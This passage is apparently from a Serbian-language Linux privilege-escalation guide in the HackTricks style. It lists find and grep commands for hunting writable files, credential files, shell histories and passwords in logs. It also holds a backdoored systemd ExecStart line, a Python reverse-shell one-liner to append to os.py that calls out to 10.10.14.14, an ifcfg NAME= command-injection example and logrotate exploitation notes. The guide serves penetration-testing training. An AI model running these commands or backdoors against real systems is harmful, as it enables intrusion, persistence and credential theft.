find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **modify the Tomcat service configuration file inside /etc/systemd/,** tada možete izmeniti sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će se izvršiti sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu da sadrže rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned datoteke
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarni fajlovi u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on traži **nekoliko datoteka koje bi mogle da sadrže lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti u tu svrhu je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koja je aplikacija otvorenog koda koja služi za izvlačenje velikog broja lozinki sa lokalnog računara za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, mogli biste pronaći **zanimljive/poverljive informacije u njima**. Što je log čudniji, to će biti zanimljiviji (verovatno).\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logs kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Za **čitanje logova grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) biće zaista korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe bi trebalo da proveriš fajlove koji u svom **name** ili unutar **content** sadrže reč "**password**", kao i da proveriš IPs i emails u logs, ili hashes regexps. Neću ovde navoditi kako se sve to radi, ali ako te zanima možeš proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Fajlovi sa dozvolom za pisanje

### Python library hijacking

Ako znaš **gde** će se python script izvršavati i **možeš pisati u** taj direktorijum ili **možeš izmeniti python libraries**, možeš modifikovati OS library i backdoor it (ako možeš pisati tamo gde će se python script izvršavati, kopiraj i nalepi os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacija logrotate

Ranljivost u `logrotate` omogućava korisnicima sa **write permissions** na log fajlu ili njegovim roditeljskim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što se `logrotate`, koji često radi kao **root**, može manipulisti da izvrši proizvoljne fajlove, naročito u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranljivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete eksploatisati pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je vrlo slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god ustanovite da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenom logova symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može da **adjust** postojeću, onda je vaš **system is pwned**.

Network skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one se \~sourced\~ na Linux-u od strane Network Manager-a (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama nije pravilno obrađen. **Ako u imenu postoji razmak, sistem pokušava da izvrši deo koji sledi posle razmaka.** To znači da **sve nakon prvog praznog razmaka se izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu izvršavati direktno ili kroz simboličke linkove koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim sistemom za upravljanje servisima koji je uveo Ubuntu, i koristi konfiguracione fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog compatibility layer-a u Upstart-u.

**systemd** se pojavljuje kao moderan init i servis menadžer, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount-ovima, i snimanje stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, što pojednostavljuje administraciju sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovanu kernel funkcionalnost userspace manager-u. Slaba autentifikacija manager-a (npr. signature checks bazirani na FD-order ili loši password skeemi) može omogućiti lokalnoj aplikaciji da se lažno predstavi kao manager i eskalira privilegije do root-a na uređajima koji su već root-ovani. Saznajte više i pogledajte detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može izvaditi putanju binarija iz command line procesa i izvršiti je sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenje \S) mogu poklapati attacker-staged listenere u zapisivim lokacijama (npr. /tmp/httpd), što dovodi do izvršenja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac primenjiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Sigurnosne zaštite kernela

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
